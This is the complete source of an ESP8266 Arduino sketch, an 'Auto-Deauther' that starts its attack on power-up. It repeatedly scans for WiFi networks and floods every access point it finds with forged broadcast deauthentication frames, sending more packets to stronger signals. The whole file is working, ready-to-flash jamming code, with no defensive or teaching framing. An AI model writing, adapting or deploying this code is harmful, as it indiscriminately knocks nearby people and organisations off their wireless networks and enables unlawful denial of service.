#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

// Network structure to store AP information
struct Network {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  bool encrypted;
};

// Deauth packet template
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type, subtype: Deauthentication
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source (AP)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
  0x00, 0x00,                         // Fragment & sequence number
  0x01, 0x00                          // Reason code (unspecified)
};

const int maxNetworks = 20;
Network networks[maxNetworks];
int networkCount = 0;

unsigned long lastScanTime = 0;
const unsigned long scanInterval = 15000; // Scan every 15 seconds
unsigned long lastStatusTime = 0;
const unsigned long statusInterval = 3000; // Status update every 3 seconds
int totalNetworksFound = 0;
int totalPacketsSent = 0;

// LED pin for status indication
const int ledPin = 2; // Usually the built-in LED on ESP8266 boards

void setup() {
  // Initialize LED pin
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH); // Turn off LED (active low on most ESP8266 boards)
  
  // Initialize serial for monitoring
  Serial.begin(115200);
  Serial.println("\nESP8266 Auto-Deauther with RSSI Targeting");
  Serial.println("==========================================");
  Serial.println("Device powered on. Attack starting automatically...");
  Serial.println("Scanning for networks...");
  
  // Set WiFi mode and disconnect
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Perform initial scan and attack
  scanNetworks();
  lastScanTime = millis();
}

void loop() {
  // Scan for networks periodically
  if (millis() - lastScanTime > scanInterval) {
    Serial.println("\n[SCANNING] Looking for networks...");
    scanNetworks();
    lastScanTime = millis();
  }
  
  // Send deauth packets to all found networks
  if (networkCount > 0) {
    sendDeauthToAllNetworks();
  }
  
  // Update status periodically
  if (millis() - lastStatusTime > statusInterval) {
    updateStatus();
    lastStatusTime = millis();
  }
  
  // Blink LED to indicate activity
  digitalWrite(ledPin, LOW); // LED on
  delay(50);
  digitalWrite(ledPin, HIGH); // LED off
  delay(500);
}

void scanNetworks() {
  int n = WiFi.scanNetworks(false, true);
  
  if (n == 0) {
    Serial.println("[SCAN] No networks found");
    networkCount = 0;
    return;
  }
  
  // Limit to maxNetworks
  if (n > maxNetworks) n = maxNetworks;
  
  // Store network information
  for (int i = 0; i < n; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].encrypted = WiFi.encryptionType(i) != ENC_TYPE_NONE;
    
    // Copy BSSID
    uint8_t* bssid = WiFi.BSSID(i);
    memcpy(networks[i].bssid, bssid, 6);
  }
  
  networkCount = n;
  totalNetworksFound += n;
  
  // Sort networks by RSSI (strongest first)
  sortNetworksByRSSI();
  
  // Display found networks
  Serial.println("[SCAN] Found " + String(networkCount) + " networks:");
  Serial.println("==========================================");
  Serial.println("ID | RSSI(dBm) | CH | SSID");
  Serial.println("------------------------------------------");
  
  for (int i = 0; i < networkCount; i++) {
    String pad = networks[i].rssi > -10 ? " " : ""; // Padding for alignment
    
    // Truncate SSID if too long
    String displaySsid = networks[i].ssid;
    if (displaySsid.length() > 20) {
      displaySsid = displaySsid.substring(0, 20) + "...";
    }
    
    Serial.print(String(i) + "  | " + pad + String(networks[i].rssi) + "    | ");
    Serial.print(String(networks[i].channel) + (networks[i].channel < 10 ? "  | " : " | "));
    Serial.println(displaySsid);
  }
  Serial.println("==========================================");
}

void sortNetworksByRSSI() {
  // Simple bubble sort to order by RSSI (strongest first)
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (networks[j].rssi < networks[j + 1].rssi) {
        Network temp = networks[j];
        networks[j] = networks[j + 1];
        networks[j + 1] = temp;
      }
    }
  }
}

void sendDeauthToAllNetworks() {
  for (int i = 0; i < networkCount; i++) {
    // Calculate packet count based on RSSI (stronger signal = more packets)
    int packetCount = mapRSSItoPackets(networks[i].rssi);
    
    Serial.print("[ATTACK] Targeting: " + networks[i].ssid.substring(0, min(20, (int)networks[i].ssid.length())));
    Serial.print(" (RSSI: " + String(networks[i].rssi) + "dBm)");
    Serial.println(" - Sending " + String(packetCount) + " packets");
    
    // Send deauth packets
    for (int p = 0; p < packetCount; p++) {
      sendDeauth(networks[i].bssid, networks[i].channel);
      totalPacketsSent++;
      delay(10); // Small delay between packets
    }
  }
}

int mapRSSItoPackets(int rssi) {
  // Stronger signals get more packets
  if (rssi >= -50) return 8;      // Very strong signal
  else if (rssi >= -60) return 6; // Strong signal
  else if (rssi >= -70) return 4; // Medium signal
  else if (rssi >= -80) return 2; // Weak signal
  else return 1;                  // Very weak signal
}

void sendDeauth(uint8_t* bssid, uint8_t channel) {
  // Set channel
  wifi_set_channel(channel);
  
  // Copy BSSID to deauth packet
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  
  // Send deauth packet
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void updateStatus() {
  // Print status update
  Serial.print("[STATUS] Networks: " + String(totalNetworksFound));
  Serial.println(" | Packets sent: " + String(totalPacketsSent));
}